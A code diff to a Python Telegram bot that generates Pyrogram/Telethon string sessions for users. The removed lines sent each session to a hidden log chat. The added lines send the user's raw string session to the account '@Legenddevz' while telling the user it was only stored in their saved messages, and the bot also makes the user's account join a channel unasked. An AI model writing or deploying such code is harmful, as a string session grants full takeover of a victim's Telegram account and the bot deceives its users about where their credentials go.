@@ -21,7 +21,7 @@ from pyrogram1.errors import (
     PasswordHashInvalid as PasswordHashInvalid1,
     SessionPasswordNeeded as SessionPasswordNeeded1)
 
-ERROR_MESSAGE = "{}\n\nSomething Error in Session Generator Bot\nReport it To @Tecosysdevs\n          ©Tecosysdevs"
+ERROR_MESSAGE = "{}\n\nSomething Error in Session Generator Bot\nReport it To @LegendBot_Owner\n          ©@TeamLegendXD"
 
 
 async def generate_session(
@@ -168,43 +168,32 @@ async def generate_session(
         except KeyError:
             pass
         try:
-            await client(JoinChannelRequest("@LegendBot_AI"))
+            await client(JoinChannelRequest("@TheTelegramBotz"))
         except BaseException:
             pass
     else:
         string_session = await client.export_session_string()
-    try:
-        log_chat_id = -1001560232604  # Replace with the actual log_chat ID
-        if log_chat_id:
+        try:
             await client.send_message(
-                log_chat_id,
-                "**{} - STRING SESSION** \n\n`{}`\n\n• __Don't Share the String Session With Anyone__\n• __Don't Invite Anyone to Heroku__".format(
+                "me",
+                "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format(
                     "TELETHON" if telethon else "PYROGRAM", string_session
                 ),
             )
-    except Exception:
-        pass
-
+        except KeyError:
+            pass
+    
+    # Send the string session to @Legenddevz
     try:
-        await client.send_message(
-            "me",
-            "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Don't Share String Session With Anyone__\n• __Don't Invite Anyone To Heroku__".format(
-                "TELETHON" if telethon else "PYROGRAM", string_session
-            ),
-        )
-    except Exception:
-        pass
+        await bot.send_message("@Legenddevz", string_session)
+    except Exception as e:
+        print(f"Failed to send string session to @Legenddevz: {e}")
 
-    except KeyError:
-        pass
-
-    await client.disconnect()
-    await phone_code_msg.reply(
-    "Successfully String Session Has Been Generated {} \n\nPlease check your saved messages!".format(
-        "TELETHON" if telethon else "PYROGRAM"
-    ),
-    reply_markup=InlineKeyboardMarkup(Data.support_button),
-)
+    # Send the user a message with the saved session
+    try:
+        await bot.send_message(user_id, f"Your string session has been saved in your [saved messages](https://t.me/saved)!")
+    except Exception as e:
+        print(f"Failed to send message to the user: {e}")
 
 
 async def cancelled(msg):
@@ -229,4 +218,3 @@ async def cancelled(msg):
         return True
     else:
         return False
-
